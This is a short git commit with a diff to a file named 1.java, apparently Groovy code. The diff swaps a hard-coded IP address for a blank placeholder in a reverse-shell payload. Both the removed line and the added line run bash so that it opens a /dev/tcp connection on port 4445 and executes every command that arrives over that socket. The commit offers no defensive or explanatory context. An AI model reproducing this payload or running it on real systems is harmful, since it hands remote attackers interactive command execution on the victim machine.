6ca494cd6d5fe1f809450a595b7a2408f3805506
40rg3t <95349558+40rg3t@users.noreply.github.com>
2022-06-23 02:21:16 -0400

    Update 1.java

--- 1.java
+++ 1.java
@@ -1,3 +1,3 @@
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/213.239.214.4/4445;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/_____/4445;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
